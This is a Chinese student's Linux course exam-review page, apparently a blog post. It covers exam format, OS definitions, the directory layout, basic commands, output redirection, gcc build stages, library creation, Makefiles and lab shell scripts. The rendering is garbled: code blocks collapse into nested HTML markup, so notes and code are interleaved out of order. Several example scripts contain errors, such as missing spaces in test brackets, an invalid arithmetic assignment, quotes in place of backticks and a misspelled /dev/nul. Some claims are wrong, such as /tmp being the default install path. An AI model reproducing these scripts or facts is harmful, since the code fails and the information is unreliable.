<li>最后三个编程题考的实验手册</li>
<li>ppt45页   pid部分     划代码考作用重点看  pid_d(?)   pid_t</li>
<li>shell编程的执行过程？）    要背
<ul>
<li>简答 / 画图会考   预处理→编译→汇编→链接</li>
</ul>
</li>
<li>人机交互图形界面   考了     ppt28页     问了windows和linux图形界面的区别     让画出来</li>
</ul>
<h3 id="考卷样子"><a class="header-anchor" href="#考卷样子">¶</a>考卷样子</h3>
<ul>
<li>一共四页</li>
<li>第一面判断题和名词解释、填空题</li>
<li>填空题有考了linux命令    目录什么的（？</li>
<li>名词解释有：内核、shell、文件系统、时间片轮转</li>
<li>应用题有画图</li>
<li>简答题：进程克隆、父进程和子进程   pid</li>
<li>编程三题是实验手册上的
<ul>
<li>前两道有一个是shell   比较简单，还有一道是file脚本（？实验手册页码第三页    有点像switch语句功能    前两道都比较简单</li>
</ul>
</li>
<li><strong>判断题8道、填空题8道、名词解释4道、简答题4道、应用题（加注释、写结果、解释函数含义、画流程图）2道、编程题3道（2easy1hard）</strong></li>
</ul>
<h1>知识点的整理开始了喵</h1>
<h2 id="可能考的概念"><a class="header-anchor" href="#可能考的概念">¶</a>可能考的概念</h2>
<ul>
<li><strong><u>内核</u></strong>： 内核是操作系统的核心，具有很多最基本的功能，如虚拟内存、多任务、共享库、需求加载、可执行程序和TCP/IP网络功能。
<ul>
<li>还有一个**<u>Linux内核</u>**的概念：操作系统的灵魂，负责管理磁盘上的文件、内存等，负责启动并运行程序，负责从网络上接收和发送数据包等等。</li>
<li>不知道考试写哪个所以都背吧（逃</li>
</ul>
</li>
<li><u><strong>Shell</strong></u>： Shell是系统的用户界面，提供了用户与内核进行交互操作的一种接口。它接收用户输入的命令并把它送入内核去执行。</li>
<li><strong><u>文件系统</u></strong>：文件系统是文件存放在磁盘等存储设备上的组织方法。</li>
<li><strong><u>时间片轮转</u></strong></li>
<li><strong><u>操作系统</u></strong>：用于管理和控制计算机所有软、硬件资源的一组程序</li>
</ul>
<h2 id="可能考的填空"><a class="header-anchor" href="#可能考的填空">¶</a>可能考的填空</h2>
<ul>
<li>
<p><u><strong>Linux目录结构</strong></u>：</p>
<ul>
<li><strong><u>/bin</u></strong>： 存放Linux<u>常用操作命令</u>的执行文件</li>
<li><strong><u>/boot</u></strong>： 存放操作<u>系统启动</u>时所要用到的程序</li>
<li><strong><u>/dev</u></strong>：包含了所有Linux系统中使用的<u>外部设备</u>（存放的实际上时一个访问这些外部设备的端口）</li>
<li><strong><u>/etc</u></strong>：存放了<u>系统管理</u>时要用到的各种配置文件和子目录
<ul>
<li><strong><u>/etc/rc.d</u></strong>： 主要存放Linux启动和关闭时要用到的脚本</li>
<li><strong><u>/etc/rc.d/init</u></strong>： 存放所有Linux服务默认的启动脚本</li>
</ul>
</li>
<li><strong><u>/home</u></strong>： Linux系统中默认的用户工具根目录。执行adduser命令后系统会在 /home 目录下为对应账号建立一个同名主目录</li>
<li><strong><u>/lib</u></strong>： 用来存放系统动态链接共享库</li>
<li><strong><u>/lost+found</u></strong>： 大多时候为空目录。只有系统异常时会将一些遗失片段放在此目录下</li>
<li><strong><u>/media</u></strong>： 光驱和软驱的挂载点</li>
<li><strong><u>/misc</u></strong>： 存放从DOS下进行安装的实用工具，一般为空</li>
<li><strong><u>/mnt</u></strong>： 软驱、光驱、硬盘的挂载点，也可以临时挂载别的文件系统</li>
<li><strong><u>/proc</u></strong>： 用于放置系统核心与执行程序所需的一些信息</li>
<li><strong><u>/root</u></strong>： 超级用户登录时的主目录</li>
<li><strong><u>/sbin</u></strong>： 存放系统管理员的常用的系统管理程序</li>
<li><strong><u>/tmp</u></strong>： 存放不同程序执行时产生的临时文件。是Linux安装软件的默认安装路径</li>
<li><strong><u>/usr</u></strong>： 存放用户的应用程序和文件（类似Windows下的Program Files的目录）</li>
<li><strong><u>/usr/bin</u></strong>： 系统用户使用的应用程序</li>
<li><strong><u>/usr/sbin</u></strong>： 超级用户使用的比较高级的管理程序和系统守护程序</li>
<li><strong><u>/usr/src</u></strong>： 内核源代码默认的放置目录</li>
<li><strong><u>/srv</u></strong>： 存放一些服务启动之后需要提取的数据</li>
<li><strong><u>/sys</u></strong>： 该目录下安装的2.6内核中新出现的一个文件系统sysfs</li>
<li><strong><u>/var</u></strong>： 存放很多服务的日志信息</li>
</ul>
</li>
<li>
<p><strong><u>Linux基本命令与使用——文件管理与传输</u></strong>：</p>
<ul>
<li><strong><u>ls</u></strong>： 列出目录内容，包括文件和子目录的名称</li>
<li><strong><u>cd</u></strong>： 改变工作目录</li>
<li><strong><u>pwd</u></strong>： 显示当前工作目录的绝对路径</li>
<li><strong><u>mkdir</u></strong>： 创建一个目录</li>
<li><strong><u>rmdir</u></strong>： 删除空的目录
<ul>
<li><strong><u>-p</u></strong>   当子目录被删除后使它也成为空目录的话，则一并删除该父目录（？是酱紫吧</li>
</ul>
</li>
<li><strong><u>rm</u></strong>： 删除文件或目录
<ul>
<li><strong><u>-f</u></strong>： 强制删除文件或目录</li>
<li><strong><u>-i</u></strong>： 删除既有文件或目录之前先询问用户</li>
<li><strong><u>-r</u></strong>： 删除目录，如果目录不为空，则递归处理将该目录下的所有文件及子目录一并处理</li>
<li><strong><u>-v</u></strong>： 显示指令执行过程</li>
</ul>
</li>
<li><strong><u>cp</u></strong>： 复制文件或目录</li>
<li><strong><u>mv</u></strong>： 移动或更名现有的文件或目录
<ul>
<li><strong>mv [参数] 源文件或目录  目标文件或目录</strong></li>
</ul>
</li>
<li><strong><u>find</u></strong>： 查找文件
<ul>
<li>这个命令没咋用过= =</li>
<li><strong><u>-print</u></strong>： 将匹配的文件输出到标准输出</li>
<li><strong><u>-exec</u></strong>： 对匹配得到文件执行该参数所给出的shell命令</li>
<li><strong><u>-ok</u></strong>： 和-exec作用相同，加了执行前确认</li>
</ul>
</li>
<li><strong><u>ln</u></strong>： 链接目录或文件
<ul>
<li><strong>ln [参数] 源文件 目标链接</strong></li>
<li><strong><u>-b</u></strong>： 删除，覆盖目标文件之前的备份</li>
<li><strong><u>-d</u></strong>： 建立硬链接</li>
<li><strong><u>-s</u></strong>： 建立符号链接（软链接）</li>
<li><strong><u>-f</u></strong>： 强行建立文件或目录的链接，不论文件或目录是否存在</li>
<li><strong><u>-i</u></strong>： 覆盖既有文件之前先询问用户</li>
<li><strong><u>-n</u></strong>： 把符号链接的目的目录视为一般文件</li>
</ul>
</li>
<li><strong><u>cat</u></strong>： 连接并显示指定的一个和多个文件的有关信息
<ul>
<li><strong>cat [选项] 文件1 文件2 …</strong></li>
<li><strong><u>-n</u></strong>： 由第一行开始对所有输出的行号编号</li>
</ul>
</li>
<li><strong><u>chmod</u></strong>： 改变文件的访问权限
<ul>
<li><strong>chmod [选项] [权限] 文件</strong></li>
<li><strong><u>-c</u></strong>： 该文件权限确定已经更改，才显示其更改动作</li>
<li><strong><u>-f</u></strong>： 该文件权限无法被更改也不要显示错误信息</li>
<li><strong><u>-v</u></strong>： 显示权限变更的详细资料</li>
<li>这个命令没看懂实例= =</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong><u>Linux基本命令与使用——磁盘管理与维护</u></strong>：</p>
<ul>
<li>
<p><strong><u>fdisk</u></strong>： 磁盘分区表操作工具</p>
<ul>
<li><strong>fdisk [参数]</strong></li>
<li>好吧这个命令就没搞懂= =</li>
</ul>
</li>
<li>
<p><strong><u>mount</u></strong>：挂载文件系统</p>
<ul>
<li><strong>mount [-参数] [设备名称] [挂载点]</strong></li>
<li>……看不懂= =！</li>
<li>后面还有一个嵌入式开发中挂载进行在线调试的例子（考完有空再了解吧！</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong><u>Linux基本命令与使用——系统管理与设置</u></strong>：</p>
<ul>
<li><strong><u>shutdown</u></strong>：系统关机指令
<ul>
<li><strong>shutdown [参数] [-t秒数] 时间 [警告信息]</strong></li>
</ul>
</li>
<li><strong><u>ps</u></strong>： 查看进程</li>
<li><strong><u>kill</u></strong>： 结束进程
<ul>
<li><strong>kill -l [信号]</strong> / <strong>kill [-信号] 进程号</strong></li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong><u>Linux基本命令与使用——网络相关</u></strong></p>
<ul>
<li><strong><u>ifconfig</u></strong>： 查看或设置网络设备
<ul>
<li><strong>ifconfig [网络设备]</strong></li>
<li><strong>ifconfig 网络设备 [IP地址] [netmask&lt;子网掩码&gt;]</strong></li>
</ul>
</li>
<li><strong><u>ping</u></strong>： 检测主机
<ul>
<li><strong>ping [参数] [主机名称或IP地址]</strong></li>
</ul>
</li>
<li><strong><u>netstat</u></strong>： 显示网络链接、路由表和网络接口信息
<ul>
<li><strong>netstat [参数]</strong></li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong><u>Linux基本命令与使用——备份压缩</u></strong></p>
<ul>
<li><strong><u>tar</u></strong>： 对文件和目录进行打包或解压
<ul>
<li><strong>tar [参数] [打包后文件名] 文件目录列表</strong></li>
</ul>
</li>
<li><strong><u>gzip</u></strong>： 压缩或解压缩文件
<ul>
<li><strong>gzip [参数] 压缩(解压缩)的文件名</strong></li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong><u>命令结果重定向</u></strong></p>
<ul>
<li>
<pre><code>	stdout	标准输出
  	stderr	标准错误
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 输出重定向到文件file，终端上只能看到标准错误</span><br><span class="line"></span><br></pre></td></tr></table></figure>
命令  &gt;file
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 错误重定向到文件file，终端上只能看到标准输出</span><br><span class="line"></span><br></pre></td></tr></table></figure>
命令  2&gt;file
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 标准输出和标准错误都重定向到file，终端上看不到任何信息</span><br><span class="line"></span><br></pre></td></tr></table></figure>
命令  &gt;file 2&gt;&amp;1
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
# 相当于
命令 1&gt;file 2&gt;&amp;1
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 屏蔽命令任何输出</span><br><span class="line"></span><br></pre></td></tr></table></figure>
&gt;/dev/null  2&gt;&amp;1
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  cp /etc/my.conf  &gt;/dev/null  2&gt;&amp;1</span><br></pre></td></tr></table></figure>

- ```
  /dev/null		# 空设备
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">    - 此句命令的结果是：</span><br><span class="line"></span><br><span class="line">      - cp命令没有目标文件，应该输出错误</span><br><span class="line">      - `2&gt;&amp;1`表示错误重定向指向标准输出</span><br><span class="line">      - `&gt;/dev/null`又使标准输出重定向到空，就是不要输出信息</span><br><span class="line"></span><br><span class="line">    - 即：一个错误的命令执行，什么功能都不实现，且没有任何信息或错误提示输出</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 可能考的简答</span><br><span class="line"></span><br><span class="line">- **&lt;u&gt;操作系统的主要功能&lt;/u&gt;**：</span><br><span class="line">  - 处理机管理</span><br><span class="line">  - 存储管理</span><br><span class="line">  - 设备管理</span><br><span class="line">  - 信息（文件）管理</span><br><span class="line">  </span><br><span class="line">- **&lt;u&gt;Linux的特点总结&lt;/u&gt;**：</span><br><span class="line">  - 开放性</span><br><span class="line">  - 多用户</span><br><span class="line">  - 多任务</span><br><span class="line">  - 良好的用户界面</span><br><span class="line">  - 设备独立性</span><br><span class="line">  - 丰富的网络功能</span><br><span class="line">  - 可靠的系统安全</span><br><span class="line">  - 良好的可移植性</span><br><span class="line"></span><br><span class="line">- **&lt;u&gt;Linux的结构&lt;/u&gt;**：</span><br><span class="line"></span><br><span class="line">  - 内核</span><br><span class="line">  - Shell</span><br><span class="line">  - 文件系统</span><br><span class="line">  - 应用程序</span><br><span class="line"></span><br><span class="line">- **&lt;u&gt;VI的三种工作模式&lt;/u&gt;**</span><br><span class="line"></span><br><span class="line">  - 命令模式</span><br><span class="line">    - 页面不能编辑，只能接受命令</span><br><span class="line">  - 输入模式</span><br><span class="line">    - a→附加命令</span><br><span class="line">    - c→修改命令</span><br><span class="line">    - i→插入命令</span><br><span class="line">    - o→另起新行</span><br><span class="line">    - r→替换命令   s→替换命令进入该模式</span><br><span class="line">    - esc返回命令模式</span><br><span class="line">  - 行编辑模式</span><br><span class="line">    - 在命令模式下输入冒号进入一个命令行，可显式地输入命令</span><br><span class="line">  - 三种模式间的切换关系</span><br><span class="line"></span><br><span class="line">  |              | 按ESC键               |          | 按“：”键            |            |</span><br><span class="line">  | ------------ | --------------------- | -------- | ------------------- | ---------- |</span><br><span class="line">  |              | ————————→             |          | —————→              |            |</span><br><span class="line">  | 文本输入状态 |                       | 命令状态 |                     | 行编辑状态 |</span><br><span class="line">  |              | ←———————              |          | ←——————             |            |</span><br><span class="line">  |              | 按A，I，S，C，O等命令 |          | 执行非退出命令，如w |            |</span><br><span class="line"></span><br><span class="line">  - vi / vim 的更多操作没试过……平时都是i起手:wq结束……（跪</span><br><span class="line">  </span><br><span class="line">- **&lt;u&gt;GCC的执行过程&lt;/u&gt;**</span><br><span class="line"></span><br><span class="line">  - 使用gcc由C语言源代码文件生成可执行文件的过程：</span><br><span class="line">    - **&lt;u&gt;预处理→编译→汇编→连接&lt;/u&gt;**</span><br><span class="line"></span><br><span class="line">  | 预处理 | cpp执行，分析包含文件、预编译语句等 |</span><br><span class="line">  | ------ | ----------------------------------- |</span><br><span class="line">  | ↓      |                                     |</span><br><span class="line">  | 编译   | ccl执行，生成目标文件               |</span><br><span class="line">  | ↓      |                                     |</span><br><span class="line">  | 汇编   | as执行，针对汇编语言                |</span><br><span class="line">  | ↓      |                                     |</span><br><span class="line">  | 连接   | ld执行，安排所有目标文件            |</span><br><span class="line"></span><br><span class="line">  - 设置输出的文件</span><br><span class="line"></span><br><span class="line">    - 默认情况下gcc编译出的程序为当前目录下的文件`a.out`</span><br><span class="line"></span><br><span class="line">    - `-o`参数可以设置输出的目标文件</span><br><span class="line"></span><br><span class="line">    - ```</span><br><span class="line">      gcc HelloWorld.c -o HelloWorld</span><br><span class="line">      # 将代码编译成可执行程序HelloWorld</span><br></pre></td></tr></table></figure>

- ```
  gcc HelloWorld.c -o /tmp/HelloWorld
  # 将目录文件设置成/tmp目录下的文件HelloWorld
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  - 几个常用的后缀名及其对应的功能</span><br><span class="line"></span><br><span class="line">  | 后缀名  | 对应功能                                     |</span><br><span class="line">  | ------- | -------------------------------------------- |</span><br><span class="line">  | -c      | 只编译不链接，生成目标文件&quot; .o&quot; gcc -c       |</span><br><span class="line">  | -S      | 只编译不汇编，生成汇编代码&quot; .s&quot; gcc -S       |</span><br><span class="line">  | -o file | 把输出文件输出到file里    as a.s -o a.o      |</span><br><span class="line">  | -g      | 在执行程序中包含标准调试信息                 |</span><br><span class="line">  | -E      | 只进行预编译，不做其他处理   &quot;.i &quot; gcc -E -o |</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">- **&lt;u&gt;链接库&lt;/u&gt;**</span><br><span class="line"></span><br><span class="line">  - 静态链接库</span><br><span class="line"></span><br><span class="line">    - 最简单的函数库形式</span><br><span class="line">    - 以`.a`结尾</span><br><span class="line">    - 链接静态库的可执行文件中包含了库中所链接函数对应的二进制执行代码</span><br><span class="line"></span><br><span class="line">  - 动态函数库</span><br><span class="line"></span><br><span class="line">    - 静态函数库的缺点：同时运行多个使用同一函数库中的函数的程序，必须为每个程序复制一份一样的函数，会占用大量内存和磁盘空间</span><br><span class="line">    - 动态函数库克服了这一缺点</span><br><span class="line"></span><br><span class="line">  - Linux下：使用`ldd`查询某个程序使用了哪些动态库</span><br><span class="line"></span><br><span class="line">  - Windows系统中：都是`dll`库</span><br><span class="line"></span><br><span class="line">  - 编译为**静态**链接库：</span><br><span class="line"></span><br><span class="line">  - ```</span><br><span class="line">    gcc -c add.c -o add.o</span><br><span class="line">    gcc -c sub.c -o sub.o</span><br><span class="line">    ar -crv libmylib.a add.o sub.o</span><br><span class="line">    # ar的三个参数：</span><br><span class="line">    # r：将文件插入归档文件中</span><br><span class="line">    # c：建立归档文件</span><br><span class="line">    # v：显示信息</span><br></pre></td></tr></table></figure>

</code></pre>
</li>
<li>
<pre><code># 使用系统默认库路径：
cp libmylib.a /lib/   # 将库文件 libmylib.a 复制到了系统的 /lib/ 目录下

gcc -o main main.c -static -lmylib  # 编译 main.c 文件，并链接名为 mylib 的静态库

# lib和.a都是系统指定的静态库文件的固定格式，mylib→静态库的名称
# 编译时，链接器会在标准路径（/usr/lib; /lib)或者用户指定的路径下去找.a的文件

gcc -o main main.c -static -L. -lmylib  # -L.选项：告诉链接器在当前目录 (.) 下寻找库文件
# 如果 libmylib.a 存在于当前工作目录中，那么链接器就会使用它。如果没有这个选项，链接器将按照默认的搜索路径去寻找库文件
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 编译为动态链接库：</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  gcc -c *.c   // 支持通配符  // 使用 gcc 编译器编译所有 .c 扩展名的源文件，并产生对应的 .o 对象文件</span><br><span class="line">  // -c 选项告诉 gcc 只进行编译阶段的操作，而不进行链接阶段的操作</span><br><span class="line">  // 预编译多个源文件</span><br><span class="line">  </span><br><span class="line">  gcc -shared -fpic -o libmym.so *.o  // 生成一个动态库   // 将之前生成的所有 .o 文件链接成一个共享库（动态链接库），命名为 libmym.so</span><br><span class="line">  </span><br><span class="line">  libmym.so;  （与位置无关代码）</span><br><span class="line">  gcc main.c -lmym -L.  // 链接动态库libmym.so编译main.c的程序</span><br></pre></td></tr></table></figure>

</code></pre>
</li>
</ul>
</li>
</ul>
<h2 id="可能考的应用题"><a class="header-anchor" href="#可能考的应用题">¶</a>可能考的应用题</h2>
<ul>
<li>
<p><strong><u>Linux人机交互——图形界面</u></strong></p>
<ul>
<li>要求会画</li>
<li><a href="http://localhost:4000/2024/07/12/CS_Notes/Linux/%5BsaveMyLinux%5DLinux%E8%AF%BE%E7%A8%8B%E8%A6%81%E7%82%B9%E5%A4%8D%E4%B9%A0/">【saveMyLinux】Linux课程要点复习 | 私の宝庫です</a>  第一个pdf27页</li>
</ul>
</li>
<li>
<p>一个带变量的Makefile的例子</p>
<ul>
<li>
<pre><code>OBJS = prog.o code.o
CC = gcc
	test: $&#123; OBJS &#125;
		$&#123; CC &#125; -o test $&#123; OBJS &#125;
	prog.o: prog.c prog.h code.h
		$&#123; CC &#125; -c prog.c -o prog.o
	code.o: code.c code.h
		$&#123; CC &#125; -c code.c -o code.o
	clean:
		rm -f *.o
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  OBJS: 包含了一个列表，列出所有需要编译的对象文件，这里是 prog.o 和 code.o</span><br><span class="line">  CC: 指定了编译器，这里使用的是 gcc</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  test: 这个 Makefile 的默认目标</span><br><span class="line">  $&#123;OBJS&#125;: 包含了所有需要的对象文件</span><br><span class="line">  -$&#123;CC&#125; -o test $&#123;OBJS&#125;: 使用指定的编译器 (gcc) 将所有对象文件链接成一个可执行文件，输出文件名为 test</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  prog.o: 从源文件 prog.c 构建对象文件 prog.o</span><br><span class="line">  prog.c: 源文件</span><br><span class="line">  prog.h, code.h: prog.c 的依赖项，如果有任何这些文件改变，则 prog.o 需要重新编译</span><br><span class="line">  -$&#123;CC&#125; -c prog.c -o prog.o: 使用 gcc 编译 prog.c 成 prog.o</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  code.o: 从源文件 code.c 构建对象文件 code.o</span><br><span class="line">  code.c: 源文件</span><br><span class="line">  code.h: code.c 的依赖项，如果这个头文件有改变，则 code.o 需要重新编译</span><br><span class="line">  -$&#123;CC&#125; -c code.c -o code.o: 使用 gcc 编译 code.c 成 code.o</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  clean: 定义了清理规则，用来删除所有 .o 文件</span><br><span class="line">  rm -f *.o: 删除所有 .o 文件</span><br></pre></td></tr></table></figure>

</code></pre>
</li>
<li>
<p>使用：在同一个目录下已经放置了<code>Makefile</code>  <code>prog.c</code> <code>code.c</code>  <code>prog.h</code>  <code>code.h</code>      运行<code>sudo make</code>     要删除所有的<code>.o</code>文件：<code>sudo make clean</code></p>
</li>
</ul>
</li>
</ul>
<h2 id="可能考的编程题"><a class="header-anchor" href="#可能考的编程题">¶</a>可能考的编程题</h2>
<h3 id="Linux下Shell脚本编程实验"><a class="header-anchor" href="#Linux下Shell脚本编程实验">¶</a>Linux下Shell脚本编程实验</h3>
<ul>
<li>实验任务：
<ul>
<li>（1）编写shell脚本程序获取<strong>环境变量</strong>并输出</li>
<li>（2）编写包含<strong>控制语句</strong>的shell脚本程序</li>
</ul>
</li>
<li>实验原理：
<ul>
<li>（1）简单的shell脚本程序类似批处理程序，只执行一些命令</li>
<li>以下greet程序，显示当前登陆用户名，并显示当前时间</li>
</ul>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># this script is used to greet loguser</span></span><br><span class="line"><span class="comment"># and print the hostname</span></span><br><span class="line"><span class="comment"># say goodbye to user and print time when script exit</span></span><br><span class="line"><span class="built_in">echo</span> hello <span class="variable">$USER</span>: <span class="variable">$HOSTNAME</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;goodbye, <span class="variable">$USER</span>&quot;</span></span><br><span class="line"><span class="built_in">date</span></span><br></pre></td></tr></table></figure>
<ul>
<li>（2）Shell脚本可以有条件、循环等控制语句，以设计较复杂逻辑功能的脚本程序</li>
<li>以下check程序，判断指定的用户名是否在系统的passwd文件中的shell脚本。
<ul>
<li>首先判断用户是否指定了一个要查找的用户名参数</li>
<li>然后循环在&quot;/etc/passwd&quot;文件中查找</li>
<li>最后提示是否找到</li>
</ul>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">NAME=<span class="variable">$1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [<span class="string">&quot;<span class="variable">$NAME</span>&quot;</span> = <span class="string">&quot;&quot;</span>]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;usage: prog name&quot;</span></span><br><span class="line">	<span class="built_in">exit</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> user <span class="keyword">in</span> $(<span class="built_in">cut</span> -d : -f 1 /etc/passwd)</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="comment">#it must be separate by space</span></span><br><span class="line">	<span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$user</span>&quot;</span> = <span class="string">&quot;<span class="variable">$NAME</span>&quot;</span> ]</span><br><span class="line">	<span class="keyword">then</span></span><br><span class="line">		<span class="built_in">echo</span> found <span class="variable">$NAME</span> <span class="keyword">in</span> /etc/passwd</span><br><span class="line">		<span class="built_in">break</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$user</span>&quot;</span> != <span class="string">&quot;<span class="variable">$NAME</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> user <span class="variable">$NAME</span> is not <span class="keyword">in</span> system</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<ul>
<li>（3）Shell脚本程序还能和用户进行交互</li>
<li>以下five程序：实现对用户输入的百分制的分数进行五分制，即非常优秀、优秀、优良、中等、不及格</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">declare</span> -i score   <span class="comment"># 声明一个整数变量score</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;please input score&quot;</span>   </span><br><span class="line"><span class="built_in">read</span> score   <span class="comment"># 读取用户输入的分数到变量score中</span></span><br><span class="line"><span class="keyword">while</span> [ <span class="string">&quot;<span class="variable">$score</span>&quot;</span> != -1] </span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	score = <span class="variable">$score</span> / 10</span><br><span class="line">	<span class="keyword">case</span> <span class="variable">$score</span> <span class="keyword">in</span> </span><br><span class="line">		9|10)	<span class="built_in">echo</span> <span class="string">&quot;very good&quot;</span></span><br><span class="line">				;;</span><br><span class="line">		8)		<span class="built_in">echo</span> <span class="string">&quot;good&quot;</span></span><br><span class="line">				;;</span><br><span class="line">		7)		<span class="built_in">echo</span> <span class="string">&quot;no good&quot;</span></span><br><span class="line">				;;</span><br><span class="line">		6)		<span class="built_in">echo</span> <span class="string">&quot;no bad&quot;</span></span><br><span class="line">				;;</span><br><span class="line">		*)		<span class="built_in">echo</span> <span class="string">&quot;bad&quot;</span></span><br><span class="line">	<span class="keyword">esac</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;please input score&quot;</span></span><br><span class="line">	<span class="built_in">read</span> score</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;script exiting...  OK&quot;</span></span><br></pre></td></tr></table></figure>
<h3 id="Makefile文件的编写"><a class="header-anchor" href="#Makefile文件的编写">¶</a>Makefile文件的编写</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Makefile文件的基本结构</span></span><br><span class="line">宏定义（变量定义）</span><br><span class="line">目标：依赖文件列表</span><br><span class="line">	命令  （命令要缩进一个[tab]）</span><br><span class="line">	...</span><br><span class="line">目标：依赖文件列表</span><br><span class="line">	命令</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># find_src_files.sh</span></span><br><span class="line"><span class="comment"># !/bin/bash</span></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">dir</span> <span class="keyword">in</span> <span class="string">&#x27;find -type d&#x27;</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	<span class="built_in">cd</span> <span class="variable">$dir</span>; <span class="built_in">echo</span> -n <span class="string">&#x27;find *.c&#x27;</span>; <span class="built_in">echo</span> -n <span class="string">&quot; &quot;</span>; <span class="built_in">cd</span> - &gt;/dev/nul</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 一个较通用的Makefile文件</span></span><br><span class="line">CC = gcc</span><br><span class="line">CFLAGS = </span><br><span class="line">CPPFLAGS = </span><br><span class="line">LINK = gcc</span><br><span class="line">LDFLAGS = </span><br><span class="line"></span><br><span class="line"><span class="comment">## debug or release flag, debug -1, release -0</span></span><br><span class="line">DEBUGorRELEASE = 0</span><br><span class="line"></span><br><span class="line"><span class="comment">## &quot;ifeq&quot; and &quot;(&quot; ,ust be separated by space</span></span><br><span class="line">ifeq ($(DEBUGorRELEASE), 0)</span><br><span class="line">OUTPUT_DIR = ./release</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">CFLAGS += -g</span><br><span class="line">CPPFLAGS += -g</span><br><span class="line">OUTPUT_DIR = ./debug</span><br><span class="line">endif</span><br><span class="line"></span><br><span class="line">target = a.out</span><br><span class="line"></span><br><span class="line">VPATH = $(shell Find -<span class="built_in">type</span> d)</span><br><span class="line">FIND_SRC_FILES = $(shell find_src_files.sh)</span><br><span class="line">SRC_FILES = $(notdir $(FIND_SRC_FILES))</span><br><span class="line"></span><br><span class="line">OBJ_FILES = $(SRC_FILES:.c=.o)</span><br><span class="line">DEP_FILES = $(OBJ_FILES:.o=.d)</span><br><span class="line">OUTPUT_OBJS = $(addprefix $(OUTPUT_DIR)/, $(OBJ_FILES))</span><br><span class="line">OUTPUT_DEPS = $(addprefix $(OUTPUT_DIR)/, $(DEP_FILES))</span><br><span class="line"></span><br><span class="line">all: $(OUTPUT_DIR)/$(target)</span><br><span class="line"></span><br><span class="line"><span class="comment">## link all objs and libs</span></span><br><span class="line">$(OUTPUT_DIR)/$(target): $(OUTPUT_OBJS)</span><br><span class="line">	<span class="built_in">echo</span> $(SRC_FILES)</span><br><span class="line">	$(LINK) $(LDFLAGS) $(OUTPUT_OBJS) $(CFLAGS) -o <span class="variable">$@</span></span><br><span class="line">	@<span class="built_in">echo</span> <span class="string">&quot;linking...................ok&quot;</span></span><br><span class="line">	</span><br><span class="line"><span class="comment">## check output dir</span></span><br><span class="line"><span class="string">&quot;<span class="subst">$(OUTPUT_DIR)</span>&quot;</span>:</span><br><span class="line">	-@[-d <span class="string">&quot;<span class="subst">$(OUTPUT_DIR)</span>&quot;</span>] || <span class="built_in">mkdir</span> <span class="string">&quot;<span class="subst">$(OUTPUT_DIR)</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
